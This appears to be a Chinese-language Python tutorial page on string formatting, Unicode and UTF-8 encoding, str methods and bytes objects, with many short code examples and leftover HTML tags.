如果转换的是字符串,Python允许指定转换后的字符串的最大字符数。这个标志被称为精度值,该精度值被放在最小宽度之后,中间用点隔开

</pre><textarea>
my_value = 3.001415926535
# 最小宽度为8,小数点后保留3位
print("my_value is: %8.3f" % my_value)   # my_value is:    3.001
# 最小宽度为8,小数点后保留3位,左边补0
print("my_value is: %08.3f" % my_value)  # my_value is: 0003.001
# 最小宽度为8,小数点后保留3位,左边补0,始终带符号
print("my_value is: %+08.3f" % my_value) # my_value is: +003.001

the_name = "Charlie"
# 只保留3个字符
print("the name is: %.3s" % the_name)    # the name is: Cha
# 只保留2个字符,最小宽度10
print("the name is: %10.2s" % the_name)  # the name is:         Ch

</textarea><pre>
【 Unicode字符串 】
Python中定义一个Unicode字符串和定义一个普通字符串一样简单:
>>> u'Hello World !'
u'Hello World !'

引号前小写的"u"表示这里创建的是一个Unicode字符串。如果想加入一个特殊字符,可以使用Python的Unicode-Escape编码。如下例所示:
>>> u'Hello\u0020World !'
u'Hello World !'
被替换的\u0020标识表示在给定位置插入编码值为0x0020的Unicode字符即空格符

例:u"我是含有中文字符组成的字符串。"
作用:后面字符串以 Unicode 格式 进行编码,一般用在中文字符串前面,防止因为源码储存格式问题,导致再次使用时出现乱码。

Python3的字符串使用Unicode,直接支持多语言。
当str和bytes互相转换时,需要指定编码。最常用的编码是UTF-8。Python当然也支持其他编码方式,比如把Unicode编码成GB2312:
print('中文'.encode('gb2312'))  # b'\xd6\xd0\xce\xc4'

</pre><pre>
【 字符编码和中文乱码 】
因为计算机只能处理数字,如果要处理文本就必须先把文本转换为数字才能处理。最早的计算机在设计时采用8个比特(bit)作为一个字节(byte),所以一个字节能表示的最大的整数就是255(二进制11111111=十进制255),如果要表示更大的整数就必须用更多的字节,比如两个字节可以表示的最大整数是65535,4个字节可以表示的最大整数是4294967295

由于计算机是美国人发明的,因此最早只有127个字符被编码到计算机里,也就是大小写英文字母、数字和一些符号,这个编码表被称为ASCII编码,比如大写字母A的编码是65,小写字母z的编码是122。

但是要处理中文显然一个字节是不够的,至少需要两个字节,而且还不能和ASCII编码冲突,所以中国制定了GB2312编码,用来把中文编进去。

全世界有上百种语言,日本把日文编到Shift_JIS里,韩国把韩文编到Euc-kr里,各国有各国的标准就会不可避免地出现冲突,结果就是在多语言混合的文本中显示出来会有乱码

因此Unicode应运而生,Unicode把所有语言都统一到一套编码里,这样就不会再有乱码问题了。

Unicode标准也在不断发展,但最常用的是用两个字节表示一个字符,如果要用到非常偏僻的字符就需要4个字节。现代操作系统和大多数编程语言都直接支持Unicode。

ASCII编码和Unicode编码的区别:ASCII编码是1个字节,而Unicode编码通常是2个字节。
字母A用ASCII编码是十进制的65,二进制的01000001
字符0用ASCII编码是十进制的48,二进制的00110000

汉字中已经超出了ASCII编码的范围,用Unicode编码是十进制的20013,二进制的01001110 00101101。
如果把ASCII编码的A用Unicode编码,只需要在前面补0就可以,因此A的Unicode编码是00000000 01000001。

新的问题又出现了:如果统一成Unicode编码,乱码问题从此消失了。但是如果写的文本基本上全部是英文的话,用Unicode编码比ASCII编码需要多一倍的存储空间,在存储和传输上就十分不划算。
所以本着节约的精神,又出现了把Unicode编码转化为可变长编码的UTF-8编码,UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节,常用的英文字母被编码成1个字节,汉字通常是3个字节,只有很生僻的字符才会被编码成4-6个字节。如果要传输的文本包含大量英文字符,用UTF-8编码就能节省空间:

字符   ASCII     Unicode               UTF-8
A      01000001  00000000 01000001     01000001
中     x         01001110 00101101     11100100 10111000 10101101

可见UTF-8编码有一个额外的好处是ASCII编码实际上可被看成UTF-8编码的一部分,所以大量只支持ASCII编码的历史遗留软件可以在UTF-8编码下继续工作

在计算机内存中统一使用Unicode编码来保证最大兼容,当需要保存到硬盘或需要传输的时候就转换为UTF-8编码来保证最小体积
用记事本编辑的时候从文件读取的UTF-8字符被转换为Unicode字符到内存里,编辑完成保存的时候再把Unicode转换为UTF-8保存到文件
浏览网页时服务器会把动态生成的Unicode内容转换为UTF-8再传输到浏览器,所以很多网页的源码上会有类似meta charset="UTF-8"的信息,表示该网页正是用的UTF-8编码

Python3中字符串默认是以Unicode编码的,所以Python3的字符串支持多语言,print('包含中文的str')可以正常显示中文

对于单个字符的编码,Python提供了ord()函数获取字符的整数表示,chr()函数把编码转换为对应的字符:
print(ord('A'))    # 65
print(ord('中'))   # 20013
print(chr(66))     # 'B'
print(chr(25991))  # '文'

如果知道字符的整数编码,还可以用十六进制这么写str:
print('\u4e2d\u6587')  # '中文'

由于Python的字符串类型是str,在内存中以Unicode表示,一个字符对应若干个字节,如果要在网络上传输或保存到磁盘上就需要把str变为以字节为单位的bytes,Python对bytes类型的数据用带b前缀的单引号或双引号表示:
x = b'ABC'
要注意区分'ABC'和b'ABC',前者是str,后者虽然内容显示得和前者一样,但bytes的每个字符都只占用一个字节

response = b'< h1>Hello World!< /h1>'
作用:b" "前缀表示后面字符串是bytes类型,表示这是一个bytes对象
用处:网络编程中服务器和浏览器只认bytes类型数据,如send函数的参数和recv函数的返回值都是bytes类型

以Unicode表示的str通过encode()方法可以编码为指定的bytes
纯英文的str可以用ASCII编码为bytes,内容是一样的,含有中文的str可以用UTF-8编码为bytes。含有中文的str无法用ASCII编码,因为中文编码的范围超过了ASCII编码的范围,Python会报错
print('ABC'.encode('ascii'))    # b'ABC'
print('中文'.encode('utf-8'))   # b'\xe4\xb8\xad\xe6\x96\x87'
print('中文'.encode('ascii'))
Traceback (most recent call last):
  File "< stdin>", line 1, in < module>
UnicodeEncodeError: 'ascii' codec can't encode characters in position 0-1: ordinal not in range(128)

在bytes中无法显示为ASCII字符的字节用\x##显示。
反过来,如果从网络或磁盘上读取了字节流,那么读到的数据就是bytes,要把bytes变为str就需要用decode()方法:
print(b'ABC'.decode('ascii'))                       # 'ABC'
print(b'\xe4\xb8\xad\xe6\x96\x87'.decode('utf-8'))  # '中文'

bytes中包含无法解码的字节时decode()方法会报错
bytes中只有一小部分无效的字节时可以传入errors='ignore'忽略错误的字节
print(b'\xe4\xb8\xad\xff'.decode('utf-8'))
Traceback (most recent call last):
  ...
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 3: invalid start byte
print(b'\xe4\xb8\xad\xff'.decode('utf-8', errors='ignore'))  # '中'

Python3中bytes和str的互相转换方式:
str.encode('utf-8')
bytes.decode('utf-8')

要想知道一个字符串有多少个字符(获得字符串长度),或者一个字符串占用多少个字节,可以使用len函数
可以用len()函数计算str包含多少个字符
print(len('ABC'))   # 3
print(len('中文'))  # 2

str换成bytes之后len()函数就计算字节数:
Python中不同的字符所占的字节数不同,数字、英文字母、小数点、下划线以及空格各占一个字节,而一个汉字可能占2~4个字节,具体占多少个取决于采用的编码方式。例如汉字在GBK/GB2312编码中占用2个字节,而在UTF-8编码中一般占用3个字节
print(len(b'ABC'))                        # 3
print(len(b'\xe4\xb8\xad\xe6\x96\x87'))   # 6
print(len('中文'.encode('utf-8')))        # 6

str1 = "人生苦短,我用Python"
print(len(str1.encode()))       # 27,因为汉字加中文标点符号共7个,占21个字节,而英文字母和英文的标点符号占6个字节,一共占用27个字节
print(len(str1.encode('gbk')))  # 20

在操作字符串时经常遇到str和bytes的互相转换,为了避免乱码问题,应当始终坚持使用UTF-8编码对str和bytes进行转换。

由于Python源代码也是一个文本文件,所以当源代码中包含中文的时候,在保存源代码时务必指定保存为UTF-8编码。当Python解释器读取源代码时,为了让它按UTF-8编码读取,通常在文件开头写上这两行:
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

第一行注释是为了告诉Linux/OS X系统,这是一个Python可执行程序,Windows系统会忽略这个注释;
第二行注释是为了告诉Python解释器,按照UTF-8编码读取源代码,否则源代码中写的中文输出可能会有乱码,-*-并没有实际意义,只是为了美观才加上去了,因此,第一种语法格式中可以直接将前后的-*-去掉

Python中默认的编码格式是ASCII格式,在没修改编码格式时无法正确打印汉字,所以在读取中文时会报错。
解决方法为只要在文件开头加入# -*- coding: UTF-8 -*-或# coding=utf-8就行了,=号两边不要空格。
Python3.X 源码文件默认使用utf-8编码,所以可以正常解析中文,无需指定UTF-8编码

申明了UTF-8编码并不意味着.py文件就是UTF-8编码的,必须并且要确保文本编辑器正在使用UTF-8 without BOM编码
如果.py文件本身使用UTF-8编码,并且也申明了# -*- coding: utf-8 -*-,打开命令提示符测试就可以正常显示中文

【 python的字符串内建函数:str是不可变对象,所有的内建方法都是返回其副本 】
print([e for e in dir(str) if not e.startswith('_')])
['capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']

>>> import string
>>> dir(string)
['Formatter', 'Template', '_ChainMap', '_TemplateMetaclass', '__all__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', '_re', '_string', 'ascii_letters', 'ascii_lowercase', 'ascii_uppercase', 'capwords', 'digits', 'hexdigits', 'octdigits', 'printable', 'punctuation', 'whitespace']
>>> string.ascii_letters
'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
>>> string.ascii_lowercase
'abcdefghijklmnopqrstuvwxyz'
>>> string.ascii_uppercase
'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
>>> string.capwords
< function capwords at 0x7f130b4fabf8>
>>> string.digits
'0123456789'
>>> string.hexdigits
'0123456789abcdefABCDEF'
>>> string.octdigits
'01234567'
>>> string.printable
'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c'
>>> string.punctuation
'!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'

string.capitalize()
把字符串的第一个字符大写
print('hello'.capitalize())  # Hello

string.casefold()
返回原字符串消除大小写的副本,消除大小写的字符串可用于忽略大小写的匹配。
消除大小写类似于转为小写,但是更加彻底一些,因为它会移除字符串中的所有大小写变化形式,例如德语小写字母'ß'相当于"ss",由于它已经是小写了,lower()不会对'ß'做任何改变,而casefold()则会将其转换为"ss"。

string.center(width)
返回一个原字符串居中并使用空格填充至长度width的新字符串,如果width小于等于len(s)则返回原字符串的副本
print('hello'.center(7))

string.count(sub, beg=0, end=len(string))
返回sub在string里面非重叠出现的次数,可选参数beg与end会被解读为切片表示法
print('hello'.count('l')) # 2

string.decode(encoding='UTF-8', errors='strict')
以encoding指定的编码格式解码string,如果出错默认报一个ValueError的异常,除非errors指定的是'ignore'或'replace'
Python有2种常用的字符串类型,分别为str和bytes类型,其中str用来表示Unicode字符,bytes用来表示二进制数据,它们之间需要用encode()和decode()进行转换
进行编码时采用的字符编码如果想使用简体中文则可以设置gb2312,gbk -> 推荐
errors参数指定错误处理方式,其可选择值可以是strict、ignore、replace、xmlcharrefreplace、backslashreplace及任何其他通过codecs.register_error()注册的值
strict:遇到非法字符就抛出异常,默认
ignore:忽略非法字符。
replace:用"？"替换非法字符。
xmlcharrefreplace:使用xml的字符引用。

string.encode(encoding='UTF-8', errors='strict')
以encoding指定的编码格式编码string,如果出错默认报一个ValueError的异常,除非errors指定的是'ignore'或'replace'
len(string.encode('utf-8'))返回字符串的字节数
len(''.encode('utf-8')) # 4
len('hello world'.encode('utf-8')) # 11

string.endswith(suffix, beg=0, end=len(string))
检查字符串是否以suffix结束,如果beg或end指定则检查指定的范围内是否以obj结束,如果是返回True,否则返回False
suffix也可以为由多个供查找的后缀构成的元组,如果有可选项beg将从所指定位置开始检查,如果有可选项end将在所指定位置停止比较

string.expandtabs(tabsize=8)
把字符串string中的tab符号转为空格,tab符号默认的空格数是8
返回字符串的副本,其中所有的制表符会由一个或多个空格替换,具体取决于当前列位置和给定的制表符宽度。 每 tabsize 个字符设为一个制表位(默认值 8 时设定的制表位在列 0, 8, 16 依次类推)。 要展开字符串,当前列将被设为零并逐一检查字符串中的每个字符。 如果字符为制表符 (\t),则会在结果中插入一个或多个空格符,直到当前列等于下一个制表位。 (制表符本身不会被复制。) 如果字符为换行符 (\n) 或回车符 (\r),它会被复制并将当前列重设为零。 任何其他字符会被不加修改地复制并将当前列加一,不论该字符在被打印时会如何显示。

</pre><textarea>
>>> '01\t012\t0123\t01234'.expandtabs()
'01      012     0123    01234'
>>> '01\t012\t0123\t01234'.expandtabs(4)
'01  012 0123    01234'

</textarea><pre>
string.find(sub, beg=0, end=len(string))
检测sub是否包含在string[beg:end]切片中,如果是则返回开始的索引值,否则返回-1
find()方法应该只在需要知道sub所在位置时使用,要检查sub是否为子字符串请使用in操作符

string.format(*args, **kwargs)
格式化字符串,基本语法是通过{}和:来代替以前的%,format函数可以接受不限个参数,位置可以不按顺序

</pre><textarea>
>>>"{} {}".format("hello", "world")    # 不设置指定位置,按默认顺序
'hello world'

>>> "The sum of 1 + 2 is {0}".format(1+2)
'The sum of 1 + 2 is 3'

>>> "{0} {1}".format("hello", "world")  # 设置指定位置
'hello world'

>>> "{1} {0} {1}".format("hello", "world")  # 设置指定位置
'world hello world'

## 设置参数
print("网站名:{name}, 地址 {url}".format(name="菜鸟教程", url="www.runoob.com"))

# 位置和关键字参数可以任意组合:
>>> print('The story of {0}, {1}, and {other}.'.format('Bill', 'Manfred', other='Georg'))
The story of Bill, Manfred, and Georg.

# 如果有一个非常长的格式字符串,不想把它拆开,那么最好按名称而不是位置引用变量来进行格式,这可以通过简单地传递字典和使用方括号 '[]' 访问键来完成:
>>> table = {'Sjoerd': 4127, 'Jack': 4098, 'Dcab': 8637678}
>>> print('Jack: {0[Jack]:d}; Sjoerd: {0[Sjoerd]:d}; ' 'Dcab: {0[Dcab]:d}'.format(table))
Jack: 4098; Sjoerd: 4127; Dcab: 8637678

# 也可以通过使用 '**' 符号将表作为关键字参数传递,这在与内置函数vars()结合使用时非常有用,它会返回包含所有局部变量的字典
>>> table = {'Sjoerd': 4127, 'Jack': 4098, 'Dcab': 8637678}
>>> print('Jack: {Jack:d}; Sjoerd: {Sjoerd:d}; Dcab: {Dcab:d}'.format(**table))
Jack: 4098; Sjoerd: 4127; Dcab: 8637678

# 通过字典设置参数
site = {"name": "菜鸟教程", "url": "www.runoob.com"}
print("网站名:{name}, 地址 {url}".format(**site))

# 通过列表索引设置参数
my_list = ['菜鸟教程', 'www.runoob.com']
print("网站名:{0[0]}, 地址 {0[1]}".format(my_list))  # "0" 是必须的

## 也可以向str.format()传入对象
class AssignValue(object):
    def __init__(self, value):
        self.value = value
my_value = AssignValue(6)
print('value为: {0.value}'.format(my_value))  # "0" 是可选的

>>> for x in range(1, 6):
...     print('{0:2d} {1:3d} {2:4d}'.format(x, x*x, x*x*x))
...
 1   1    1
 2   4    8
 3   9   27
 4  16   64
 5  25  125

## 格式化数字
>>> print("{:.2f}".format(3.1415926));
3.14

3.1415926   {:.2f}  3.14    保留小数点后两位
3.1415926   {:+.2f} +3.14   带符号保留小数点后两位
-1  {:+.2f} -1.00   带符号保留小数点后两位
2.71828 {:.0f}  3   不带小数
5   {:0>2d} 05  数字补零 (填充左边, 宽度为2)
5   {:x<4d} 5xxx    数字补x (填充右边, 宽度为4)
10  {:x<4d} 10xx    数字补x (填充右边, 宽度为4)
1000000 {:,}    1,000,000   以逗号分隔的数字格式
0.25    {:.2%}  25.00%  百分比格式
1000000000  {:.2e}  1.00e+09    指数记法
13  {:10d}          13  右对齐 (默认, 宽度为10)
13  {:<10d} 13  左对齐 (宽度为10)
13  {:^10d}     13  中间对齐 (宽度为10)

11  '{:b}'.format(11)  1011   进制
    '{:d}'.format(11)  11
    '{:o}'.format(11)  13
    '{:x}'.format(11)  b
    '{:#x}'.format(11)  0xb
    '{:#X}'.format(11)    0XB

^, <, > 分别是居中、左对齐、右对齐,后面带宽度, :号后面带填充的字符,只能是一个字符,不指定则默认是用空格填充。
+ 表示在正数前显示 +,负数前显示 -;  (空格)表示在正数前加空格
b、d、o、x 分别是二进制、十进制、八进制、十六进制

## 可以使用大括号{}来转义大括号
print ("{}对应的位置是{{0}}".format("hello"))  # hello对应的位置是{0}

</textarea><pre>
string.format_map(mapping)
类似于str.format(**mapping),区别在于mapping会被直接使用而不是复制到一个dict,适宜使用此方法的一个例子是当mapping为dict的子类的情况:

</pre><textarea>
class Default(dict):
    def __missing__(self, key):
        return key
print('{name} was born in {country}'.format_map(Default(name='Guido'))) # 'Guido was born in country'

</textarea><pre>
string.index(sub, beg=0, end=len(string))
跟find()方法一样,只不过如果sub不在string中会报一个异常ValueError: substring not found

string.isascii()
如果字符串为空或所有字符均为ASCII字符则返回真值,否则返回假值。 ASCII字符的码位范围为U+0000-U+007F

string.isalnum()
如果string至少有一个字符并且所有字符都是字母或数字则返回True,否则返回False
如果以下方法中的一个返回True则字符c为字母或数字: c.isalpha(), c.isdecimal(), c.isdigit(), or c.isnumeric()

string.isalpha()
如果string至少有一个字符并且所有字符都是字母则返回True,否则返回False

string.isdecimal()
如果string只包含十进制数字则返回True 否则返回False

string.isdigit()
字符串string中至少有一个字符且所有字符均为数字字符则返回True,否则返回False

string.islower()
如果string中包含至少一个区分大小写的字符,并且所有这些(区分大小写的)字符都是小写则返回True,否则返回False

string.isnumeric()
如果string中只包含数字字符则返回True,否则返回False

string.isspace()
如果string中只包含空格则返回True,否则返回False.

string.istitle()
如果string是标题化的(见title())则返回True,否则返回False

string.isupper()
如果string中包含至少一个区分大小写的字符,并且所有这些(区分大小写的)字符都是大写则返回True,否则返回False

string.join(seq)
字符串拼接,以string作为分隔符将seq中所有的元素合并为一个新的字符串,是split()的逆方法,将列表或元组中多个字符串采用固定的分隔符连接成一个字符串

</pre><textarea>
print('-'.join(['one', 'two', 'three']))  # one-two-three
print('.'.join(['c','biancheng','net']))  # 'c.biancheng.net'
dir = '','usr','bin','env'
print(type(dir))                          # < class 'tuple'>
print('/'.join(dir))                      # '/usr/bin/env'

</textarea><pre>
string.ljust(width)
返回一个原字符串左对齐,并使用空格填充至长度width的新字符串,如果width小于等于len(s)则返回原字符串的副本

string.lower()
转换string中所有大写字符为小写

string.lstrip([chars])
截掉string左边的空格
返回原字符串的副本,移除其中的前导字符,chars参数为指定要移除字符的字符串,如果省略或为None则chars参数默认移除空格符,实际上chars参数并非指定单个前缀,而是会移除参数值的所有组合

</pre><textarea>
>>> '   spacious   '.lstrip()
'spacious   '
>>> 'www.example.com'.lstrip('cmowz.')
'example.com'

</textarea><pre>
static str.maketrans(intab, outtab])
此静态方法返回一个可供str.translate()使用的转换对照表,对于接受两个参数的最简单的调用方式,第一个参数是字符串表示需要转换的字符,第二个参数也是字符串表示转换的目标。

string.partition(str)
有点像find()和split()的结合体,从str出现的第一个位置起,把字符串string分成一个3元素的元组 (string_pre_str,str,string_post_str),如果string中不包含str则string_pre_str == string
在str首次出现的位置拆分字符串,返回一个3元组,其中包含分隔符之前的部分、分隔符本身及分隔符之后的部分。 如果分隔符未找到则返回的3元组中包含字符本身以及两个空字符串

string.replace(str1, str2,  num=string.count(str1))
把string中的str1替换成str2,如果num指定则替换不超过num次
a = 'abc'
print(a.replace('a', 'A'))  # 'Abc'
print(a)  # 'abc'

string.rfind(str, beg=0,end=len(string) )
类似于find()函数,不过是从右边开始查找

string.rindex( str, beg=0,end=len(string))
类似于index(),不过是从右边开始

string.rjust(width)
返回一个原字符串右对齐,并使用空格填充至长度width的新字符串

string.rpartition(str)
类似于partition()函数,不过是从右边开始查找

string.rstrip([chars])
删除string字符串末尾的空格
返回原字符串的副本,移除其中的末尾字符。 chars参数为指定要移除字符的字符串。 如果省略或为None则chars参数默认移除空格符。 实际上chars参数并非指定单个后缀,而是会移除参数值的所有组合

</pre><textarea>
print('   spacious   '.rstrip())    # '   spacious'
print('mississippi'.rstrip('ipz'))  # 'mississ'

</textarea><pre>
str.rsplit(sep=None, maxsplit=-1)
返回一个由字符串内单词组成的列表,使用sep作为分隔字符串。 如果给出了maxsplit则最多进行maxsplit次拆分,从最右边开始。 如果sep未指定或为None,任何空白字符串都会被作为分隔符。 除了从右边开始拆分,rsplit()的其他行为都类似于split()

str.split(sep=None, maxsplit=-1)
通过指定分隔符对字符串进行切片,如果参数maxsplit有指定值则分隔maxsplit+1个子字符串,返回分割后的字符串列表,使用指定的分隔符拆分空字符串将返回['']
str:表示要进行分割的字符串
sep:用于指定分隔符,可以包含多个字符。此参数默认为None表示所有空字符包括空格、换行符"\n"、制表符"\t"等
maxsplit:可选参数,用于指定分割的次数,最后列表中子串的个数最多为maxsplit+1。如果不指定或指定为-1则表示分割次数没有限制。
如果不指定sep参数,那么也不能指定maxsplit参数

</pre><textarea>
print('one-two-three'.split('-'))                  # ['one', 'two', 'three']

str = "Line1-abcdef \nLine2-abc \nLine4-abcd";
print(str.split( ))       # 以空格为分隔符,包含\n,输出:['Line1-abcdef', 'Line2-abc', 'Line4-abcd']
print(str.split(' '))     # ['Line1-abcdef', '\nLine2-abc', '\nLine4-abcd']
print(str.split(' ', 1 )) # 以空格为分隔符,分隔成两个,输出:['Line1-abcdef', '\nLine2-abc \nLine4-abcd']

str = "C语言中文网 >>> c.biancheng.net"
print(str)               # 'C语言中文网 >>> c.biancheng.net'
list1 = str.split()      # 采用默认分隔符进行分割
print(list1)             # ['C语言中文网', '>>>', 'c.biancheng.net']

list2 = str.split('>>>') # 采用多个字符进行分割
print(list2)             # ['C语言中文网 ', ' c.biancheng.net']

list3 = str.split('.')   #采用 . 号进行分割
print(list3)             # ['C语言中文网 >>> c', 'biancheng', 'net']

list4 = str.split(' ',4) # 采用空格进行分割,并规定最多只能分割成4个子串
print(list4)             # ['C语言中文网', '>>>', 'c.biancheng.net']

list5 = str.split(' ',2) # 采用空格进行分割,并规定最多只能分割成2个子串
print(list5)             # ['C语言中文网', '>>>', 'c.biancheng.net']

list6 = str.split('>')   # 采用>字符进行分割
print(list6)             # ['C语言中文网 ', '', '', ' c.biancheng.net']

print('1,,2'.split(','))     # ['1', '', '2']
print('1,2,,3,'.split(','))  # ['1', '2', '', '3', '']

</textarea><pre>
string.splitlines([keepends])
按照行('\r'(回车),'\r\n'(回车换行),\n'(换行))分隔,返回一个包含各行作为元素的列表,结果列表中不包含行边界,参数keepends为False时不包含换行符,如果为True则保留换行符

string.startswith(prefix, beg=0,end=len(string))
检查字符串是否是以prefix开头,是则返回True,否则返回False
prefix也可以为由多个供查找的前缀构成的元组。 如果有可选项start将从所指定位置开始检查,如果有可选项end将在所指定位置停止比较

string.strip([chars])
在string上执行lstrip()和rstrip()
chars用来指定要删除的字符,可以同时指定多个,如果不指定或为None则默认会删除空格以及制表符、回车符、换行符等特殊字符
实际上chars参数并非指定单个前缀或后缀;而是会移除参数值的所有组合
str = "  c.biancheng.net \t\n\r"
str.strip()        # 'c.biancheng.net'
str.strip(" ,\r")  # 'c.biancheng.net \t\n'
print(str)         # '  c.biancheng.net \t\n\r'

string.swapcase()
翻转string中的大小写

string.title()
返回"标题化"的string,就是说所有单词都是以大写开始,其余字母均为小写(见istitle())

</pre><textarea>
print('Hello world'.title()) # 'Hello World'

>>> "they're bill's friends from the UK".title()
"They'Re Bill'S Friends From The Uk"
>>> #可以使用正则表达式来构建针对撇号的特别处理:
>>>
>>> import re
>>> def titlecase(s):
...     return re.sub(r"[A-Za-z]+('[A-Za-z]+)?",
...                   lambda mo: mo.group(0)[0].upper() +
...                              mo.group(0)[1:].lower(),
...                   s)
...
>>> titlecase("they're bill's friends.")
"They're Bill's Friends."

</textarea><pre>
string.translate(table, del="")
根据table给出的表(包含256个字符)转换string的字符,要过滤掉的字符放到del参数中

string.upper()
转换string中的小写字母为大写

string.zfill(width)
返回长度为width的字符串,原字符串string右对齐,前面填充0
print("42".zfill(5))  # '00042'
print("-42".zfill(5))  # '-0042'

</pre>
</div>

<div id="bytes">
<h4>bytes对象</h4><pre>
操作二进制数据的核心内置类型是bytes和bytearray。 它们由memoryview提供支持,该对象使用缓冲区协议来访问其他二进制对象所在内存,不需要创建对象的副本

Python3新增了bytes类型,用于代表字节串。字符串str由多个字符组成,以字符为单位进行操作;字节串bytes由多个字节组成,以字节为单位进行操作。
bytes和str除操作的数据单元不同之外,它们支持的所有方法都基本相同,bytes也是不可变序列。

bytes对象是由单个字节构成的不可变序列,由于许多主要二进制协议都基于ASCII文本编码,因此bytes对象提供了一些仅在处理ASCII兼容数据时可用并在许多特性上与字符串对象紧密相关的方法

bytes对象只负责以字节(二进制格式)序列来记录数据,至于这些数据到底表示什么内容,完全由程序决定。如果采用合适的字符集,字符串可以转换成字节串;反过来,字节串也可以恢复成对应的字符串。

1、bytes主要是给在计算机看的,string主要是给人看的
2、中间有个桥梁就是编码规则,主要是utf8
3、bytes对象是二进制,很容易转换成16进制如\x64
4、string就是展示的内容如'abc'
5、string经过编码encode转化成二进制对象给计算机识别
6、bytes经过反编码decode转化成string,但反编码的编码规则是有范围,\xc8就不是utf8识别的范围

由于bytes保存的就是原始的字节(二进制格式)数据,因此bytes对象可用于在网络上传输数据,也可用于存储各种二进制格式的文件,比如图片、音乐等文件。

class bytes([source[, encoding[, errors]]])
表示bytes字面值的语法与字符串字面值的大致相同,只是添加了一个b前缀:
单引号: b'同样允许嵌入 "双" 引号'。
双引号: b"同样允许嵌入 '单' 引号"。
三重引号: b'''三重单引号''', b"""三重双引号"""

bytes字面值中只允许ASCII字符,无论源代码声明的编码为何,任何超出127的二进制值必须使用相应的转义序列形式加入bytes字面值。
像字符串字面值一样,bytes字面值也可以使用r前缀来禁用转义序列处理

除了字面值形式,bytes对象还可以通过其他几种方式来创建:
指定长度的以零值填充的bytes对象: bytes(10)
通过由整数组成的可迭代对象: bytes(range(20))
通过缓冲区协议复制现有的二进制数据: bytes(obj)

如果希望将一个字符串转换成bytes对象,有如下三种方式:
1、如果字符串内容都是ASCII字符,则可以通过直接在字符串之前添加b来构建字节串值。
2、调用bytes()函数即bytes的构造方法将字符串按指定字符集转换成字节串,默认使用UTF-8字符集。
3、调用字符串本身的encode()方法将字符串按指定字符集转换成字节串,默认使用UTF-8字符集。

</pre>创建字节串<textarea>
# 创建一个空的bytes
b1 = bytes()
# 创建一个空的bytes值
b2 = b''
# 通过b前缀指定hello是bytes类型的值
b3 = b'hello'
print(type(b3), b3)     # < class 'bytes'> b'hello'
print(b3[0])            # 104
print(b3[2:4])          # b'll'

# 调用bytes方法将字符串转成bytes对象
b4 = bytes('我爱Python编程', encoding='utf-8')
print(type(b4), b4)     # < class 'bytes'> b'\xe6\x88\x91\xe7\x88\xb1Python\xe7\xbc\x96\xe7\xa8\x8b'

# 利用字符串的encode()方法编码成bytes
b5 = "学习Python很有趣".encode('utf-8')
print(type(b5), b5)     # < class 'bytes'> b'\xe5\xad\xa6\xe4\xb9\xa0Python\xe5\xbe\x88\xe6\x9c\x89\xe8\xb6\xa3'

# 调用bytes对象的decode()方法将bytes对象解码成字符串,默认使用UTF-8进行解码
st = b5.decode('utf-8')
print(st)               # 学习Python很有趣

</textarea><pre>
字节串和字符串非常相似,只是字节串里的每个数据单元都是1字节
计算机底层有两个基本概念:位(bit)和字节(Byte),bit代表1位,要么是0,要么是1;Byte代表1字节,1字节包含8位。
在字节串中每个数据单元都是字节,也就是8位,其中每4位(相当于4位二进制数,最小值为0 ,最大值为15)可以用一个十六进制数来表示,因此每字节需要两个十六进制数表示,所以可以看到上面的输出是 b'\xe6\x88\x91\xe7\x88\xb1Python\xe7\xbc\x96\xe7\xa8\x8b',比如\xe6就表示1字节,其中\x表示十六进制,e6就是两位的十六进制数。

由于两个十六进制数码精确对应一个字节,因此十六进制数是描述二进制数据的常用格式,相应地bytes类型具有从此种格式读取数据的附加类方法:

classmethod fromhex(string)
此bytes类方法返回一个解码给定字符串的bytes对象。 字符串必须由表示每个字节的两个十六进制数码构成,其中的ASCII空白符会被忽略。

>>> bytes.fromhex('2Ef0 F1f2  ')
b'.\xf0\xf1\xf2'

hex()
返回一个字符串对象,该对象包含实例中每个字节的两个十六进制数字,将bytes对象转换为对应的十六进制表示

>>> b'\xf0\xf1\xf2'.hex()
'f0f1f2'

由于bytes对象是由整数构成的序列,类似于元组,因此对于一个bytes对象b,b[0]将为一个整数,而b[0:1]将为一个长度为1的bytes对象
这与文本字符串不同,索引和切片所产生的将都是一个长度为1的字符串

bytes对象的表示使用字面值格式 (b'...'),因为它通常都要比像bytes([46, 46, 46])这样的格式更好用,总是可以使用list(b)将bytes对象转换为一个由整数构成的列表。

【 字符集 】
计算机底层并不能保存字符,但程序总是需要保存各种字符的,解决办法:为每个字符编号,当程序要保存字符时实际上保存的是该字符的编号;当程序读取字符时,读取的其实也是编号,接下来要去查"编号一字符对应表"(简称码表)才能得到实际的字符。
因此所谓的字符集就是所有字符的编号组成的总和。早期美国人给英文字符、数字、标点符号等字符进行了编号,他们认为所有字符加起来顶多100多个,只要1字节(8位,支持256个字符编号)即可为所有字符编号,这就是ASCII字符集。

后来亚洲国家纷纷为本国文字进行编号即制订本国的字符集,但这些字符集并不兼容。于是美国人又为世界上所有书面语言的字符进行了统一编号,这次他们用了两个字节(16位,支持65536个字符编号),这就是Unicode字符集。实际使用的UTF-8, UTF-16等其实都属于Unicode字符集。

由于不同人对字符的编号完全可以很随意,比如同一个"爱"字,可以为其编号为99,可以为其编号为199,所以同一个编号在不同字符集中代表的字符完全有可能是不同的。因此对于同一个字符串,如果采用不同的字符集来生成bytes对象就会得到不同的bytes对象。

【 bytearray对象 】
